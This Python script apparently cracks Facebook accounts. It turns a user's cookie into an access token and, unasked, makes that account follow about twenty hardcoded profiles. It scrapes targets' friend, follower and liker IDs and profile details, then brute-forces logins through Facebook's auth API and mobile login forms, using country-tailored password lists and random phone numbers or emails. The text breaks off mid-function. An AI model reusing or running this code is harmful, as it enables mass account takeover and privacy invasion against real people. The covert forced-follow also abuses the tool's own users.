#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤ Romm Intrnal ❤

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def romm_intrnal():
     print("""\x1b[0;31m      ________  __ _____      _____ _____ ____ _____ ______
    \x1b[0;31m  /__  ) /  /\ / __)      / _ \  __ \/ _ \/ __ \/____/\x1b[0;37m  ® 
    \x1b[0;31m    / /\ \ / // /   ___  / __ / /_/ /    / / / /\ \    
    \x1b[0;37m \ / /  \ v // /_  /__/ / _  \ __  / /\ \ /_/ /__\ \    
    \x1b[0;37m  \_/    \_/ \___/     /____/_/ /_/_/ /_/____//____/ \x1b[0;33mv3.0

                                 \x1b[0;36m[✓] Created : BY Romm Intrnal
                                 \x1b[0;36m[✓] Telp/WA : 087887036xxx
                                 \x1b[0;36m[✓] YouTube : ANGEL PROJECT
\x1b[0;32m================================================================""")

host="https://mbasic.facebook.com"
ok = []
cp = []
ttl =[]
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
durasi = str(datetime.now().strftime("%d/%m/%Y"))
tahun = current.year
bulan = current.month
hari = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def country():
    os.system("clear")
    romm_intrnal()
    print("\n%s[%s Choose Country %s]\n"%(o,k,o))
    print("%s[%s1%s] %sIndonesia"%(o,k,o,p))
    print("%s[%s2%s] %sBangladesh/India"%(o,k,o,p))
    print("%s[%s3%s] %sPakistan"%(o,k,o,p))
    print("%s[%s4%s] %sUSA"%(o,k,o,p))
    print("%s[%s0%s] %sNone"%(o,k,o,p))
    choose_country()
    
def choose_country():
    cc = input("\n%s[%s•%s] %sChoose : "%(o,k,o,p))
    if cc in[""]:
        print((o+"\n["+k+"!"+o+"]"+p+" Fill In The Correct"))
    elif cc in["1","01"]:
        os.system("rm -rf country.txt")
        cou = "id"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            jvc_baros()
        except (KeyError, IOError):
            jvc_baros()
    elif cc in["2","02"]:
        os.system("rm -rf country.txt")
        cou = "bd"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            jvc_baros()
        except (KeyError, IOError):
            jvc_baros()
    elif cc in["3","03"]:
        os.system("rm -rf country.txt")
        cou = "pk"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            jvc_baros()
        except (KeyError, IOError):
            jvc_baros()
    elif cc in["4","04"]:
        os.system("rm -rf country.txt")
        cou = "us"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            jvc_baros()
        except (KeyError, IOError):
            jvc_baros()
    elif cc in["0","00"]:
        os.system("rm -rf country.txt")
        cou = " "
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            jvc_baros()
        except (KeyError, IOError):
            jvc_baros()
    else:
        print((o+"\n["+k+"!"+o+"]"+p+" Fill In The Correct"))

### LOGIN METHODE ###

def logs():
  os.system("clear")
  romm_intrnal()
  print((o+"\n["+k+"1"+o+"]"+p+" Login Token"))
  print((o+"["+k+"2"+o+"]"+p+" Login Cookies"))
  print((o+"["+k+"0"+o+"]"+p+" Exit"))
  sek=input(o+"\n["+k+"•"+o+"]"+p+" Choose : ")
  if sek=="":
    print((o+"\n["+k+"!"+o+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
    defaultua()
    log_token()
  elif sek=="2":
    defaultua()
    gen()
  elif sek=="0":
    exit()
  else:
    print((o+"\n["+k+"!"+o+"]"+p+" Fill In The Correct"))
    logs()

def log_token():
    os.system("clear")
    romm_intrnal()
    toket = input(o+"\n["+k+"•"+o+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((o+"\n["+k+"•"+o+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((o+"["+k+"!"+o+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        romm_intrnal()
        cookie = input(o+"\n["+k+"•"+o+"]"+p+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 11; vivo 1901) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((o+"["+k+"!"+o+"]"+p+" No Connection"))
        except [KeyError,IOError]:
            print((o+"["+k+"!"+o+"]"+p+" Cookies Invalid"))
            os.system("clear")
            logs()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((o+"\n["+k+"•"+o+"]"+p+" Login Successful"))
        bot_follow()

### BOT FOLLOW ### Jangan Diganti Anjing !!!

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((o+"\n["+k+"!"+o+"]"+p+" Token Invalid"))
		logs()
	jalan("%s[%s•%s] %sPlease Wait..."%(o,k,o,p))
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
	requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + toket) # Antonius Raditya M
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) # Abigaille Dirgantara
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       # Boirah
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) # Anita Zuliatin
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) # Dapunta Xayonara
	requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + toket) # Dapunta Adya R
	requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + toket)      # Wati Waningsih
	requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + toket)      # Rofi Nurhanifah
	requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + toket) # Diah Ayu Kharisma
	requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + toket) # Xena Alexander
	requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + toket) # Alexandra Scarlett
	requests.post("https://graph.facebook.com/100000424033832/subscribers?access_token=" + toket) # Pebrima Jun Helmi
	requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + toket) # Aisya Asyaqila
	requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + toket) # Ameiliani Dethasia
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) # Muh Rizal Fiansyah
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) # Rizal F
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) # Angga Kurniawan
	requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + toket) # Moh Yayan
	jvc_baros()

### MAIN MENU ###

def jvc_baros():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((o+"["+k+"•"+o+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    ngr = open('country.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia"
    elif "bd" in ngr:
        negara = "Bangladesh/India"
    elif "pk" in ngr:
        negara = "Pakistan"
    elif "us" in ngr:
        negara = "USA"
    elif " " in ngr:
        negara = "None"
    os.system("clear")
    romm_intrnal()
    print((o+"\n[ "+k+" Welcome "+a["name"]+o+" ]"+p))
    print((o+"\n["+k+"•"+o+"]"+p+" Your ID : "+id))
    print((o+"["+k+"•"+o+"]"+p+" Your IP : "+ip))
    print((o+"["+k+"•"+o+"]"+p+" Status  : "+m+"Test Version"+p))
    print((o+"["+k+"•"+o+"]"+p+" Joined  : "+durasi))
    print((o+"["+k+"•"+o+"]"+p+" Crack   : "+negara))
    print((o+"\n["+k+"1"+o+"]"+p+" Crack ID From Public/Friend"))
    print((o+"["+k+"2"+o+"]"+p+" Crack ID From Followers"))
    print((o+"["+k+"3"+o+"]"+p+" Crack ID From Likers Post"))
    print((o+"["+k+"4"+o+"]"+p+" Crack By Phone Number"))
    print((o+"["+k+"5"+o+"]"+p+" Crack By Email"))
    print((o+"["+k+"6"+o+"]"+p+" Get Data Target"))
    print((o+"["+k+"7"+o+"]"+p+" Result Crack"))
    print((o+"["+k+"8"+o+"]"+p+" User Agent"))
    print((o+"["+k+"0"+o+"]"+p+" Logout"))
    choose_menu()

def choose_menu():
	r=input(o+"\n["+k+"•"+o+"]"+p+" Choose : ")
	if r=="":
		print((o+"["+k+"!"+o+"]"+p+" Fill In The Correct"))
		jvc_baros()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="8":
		menu_user_agent()
	elif r=="0":
		try:
			jalan(o+"\n["+k+"•"+o+"]"+p+" Thanks For Using My Script")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((o+"["+k+"!"+o+"]"+p+" Error %s"%e))
	else:
		print((o+"["+k+"!"+o+"]"+p+" Wrong Input"))
		jvc_baros()	

def pilihcrack(file):
  print((o+"\n["+k+"1"+o+"]"+p+" Api ("+k+"Fast"+p+")"))
  print((o+"["+k+"2"+o+"]"+p+" Api + TTL ("+k+"Fast"+p+")"))
  print((o+"["+k+"3"+o+"]"+p+" Mbasic ("+k+"Slow"+p+")"))
  print((o+"["+k+"4"+o+"]"+p+" Mbasic + TTL ("+k+"Slow"+p+")"))
  print((o+"["+k+"5"+o+"]"+p+" Free Facebook ("+k+"Super Slow"+p+")"))
  krah=input(o+"\n["+h+"•"+o+"]"+p+" Choose : ")
  if krah in[""]:
    print((o+"["+k+"!"+o+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    crackffb(file)
  else:
    print((o+"["+k+"!"+o+"]"+p+" Fill In The Correct"))
    pilihcrack(file)

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+k+"!"+o+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((o+"\n["+k+"•"+o+"]"+p+" Type \'me\' To Dump From Friendlist"))
		idt = input(o+"["+k+"•"+o+"]"+p+" User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+k+"•"+o+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((o+"["+k+"!"+o+"]"+p+" ID Not Found"))
			print((o+"\n[ "+k+"Back"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+k+"•"+o+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(o+"["+k+"!"+o+"]"+p+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+k+"!"+o+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(o+"\n["+k+"•"+o+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+k+"•"+o+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((o+"["+k+"!"+o+"]"+p+" ID Not Found"))
			print((o+"\n[ "+k+"Back"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+k+"•"+o+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(o+"["+k+"!"+o+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+k+"!"+o+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(o+"\n["+k+"•"+o+"]"+p+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+k+"•"+o+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((o+"["+k+"!"+o+"]"+p+" ID Not Found"))
			print((o+"\n[ "+k+"Back"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+k+"•"+o+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(o+"["+k+"!"+o+"]"+p+" Error : %s"%e)

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((o+"\n["+k+"•"+o+"]"+p+" Number Must Be 5 Digit"))
  print((o+"["+k+"•"+o+"]"+p+" Example : 92037"))
  kode=str(input(o+"["+k+"•"+o+"]"+p+" Input Number : "))
  exit((o+"\n["+k+"!"+o+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((o+"\n["+k+"!"+o+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(o+"["+k+"•"+o+"]"+p+" Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(o+"\n["+k+"•"+o+"]"+p+" Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(o+"\n[ "+k+"Back"+o+" ]"+p)
  jvc_baros()

def random_email():
  data = []
  nama=input(o+"\n["+k+"•"+o+"]"+p+" Target Name : ")
  domain=input(o+"["+k+"•"+o+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((o+"["+k+"•"+o+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(o+"["+k+"•"+o+"]"+p+" Amount : "))
  setpw=input(o+"["+k+"•"+o+"]"+p+" Set Password : ").split(',')
  print(o+"\n["+k+"•"+o+"]"+p+" Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(o+"\n[ "+k+"Back"+o+" ]"+p)
  jvc_baros()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+k+"!"+o+"]"+p+" Token Invalid"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(o+"\n["+k+"•"+o+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+k+"•"+o+"]"+p+" Name Account     : "+op["name"]))
			print((o+"["+k+"•"+o+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+k+"•"+o+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+k+"•"+o+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+k+"•"+o+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((o+"["+k+"•"+o+"]"+p+" Total Friend     : %s"%(len(id))))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Total Friend     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((o+"["+k+"•"+o+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+k+"•"+o+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Website          : -"))
			except IOError:
				print((o+"["+k+"•"+o+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+k+"•"+o+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((o+"["+k+"•"+o+"]"+p+" Update Time      : -"))
			except IOError:
				print((o+"["+k+"•"+o+"]"+p+" Update Time      : -"))
			input(o+"\n[ "+k+"Back"+o+" ]"+p)
			jvc_baros()
		except KeyError:
			input(o+"\n[ "+k+"Back"+o+" ]"+p)
			jvc_baros()
	except Exception as e:
		exit(o+"["+k+"•"+o+"]"+p+" Error : %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	ct = open('country.txt', 'r').read()
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "id" in ct:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("123456")
				elif "bd" in ct:
					results.append("786786")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("iloveyou")
					results.append("passwords")
	return results

### USER AGENT ###

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n%s[%s1%s] %sGet User Agent"%(o,h,o,p))
    print("%s[%s2%s] %sChange User Agent"%(o,h,o,p))
    print("%s[%s3%s] %sRemove User Agent"%(o,h,o,p))
    print("%s[%s4%s] %sCheck User Agent"%(o,h,o,p))
    print("%s[%s0%s] %sBack"%(o,h,o,p))
    pilih_menu_user_agent()

def pilih_menu_user_agent():
    pmu = input("\n%s[%s•%s] %sChoose : "%(o,h,o,p))
    if pmu in[""]:
        print((o+"\n["+h+"!"+o+"]"+p+" Fill In The Correct"))
    elif pmu in["1","01"]:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input(o+"\n[ "+h+"Back"+o+" ]"+p)
        jvc_baros()
    elif pmu in["2","02"]:
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n%s[%s!%s] %sUser Agent Was Removed"%(o,h,o,p))
        input(o+"\n[ "+h+"Back"+o+" ]"+p)
        jvc_baros()
    elif pmu in["4","04"]:
        check_ugent()
    elif pmu in["0","00"]:
        jvc_baros()
    else:
        print((o+"\n["+h+"!"+o+"]"+p+" Fill In The Correct"))

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(k,p,k,p,h))
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n%s[%s•%s] %sSuccess Changed User Agent"%(m,p,m,p))
        input(o+"\n[ "+h+"Back"+o+" ]"+p)
        jvc_baros()
    except (KeyError, IOError):
        jalan("\n%s[%s•%s] %sFailed To Change User Agent"%(m,p,m,p))
        input(o+"\n[ "+h+"Back"+o+" ]"+p)
        jvc_baros()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = ("%s[%s!%s] %sUser Agent Not Found"%(o,h,o,p))
    except:pass
    print ("\n%s[%s•%s] %sYour User Agent : \n\n%s%s"%(k,p,k,p,h,ungser))
    input(o+"\n[ "+h+"Back"+o+" ]"+p)
    jvc_baros()

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
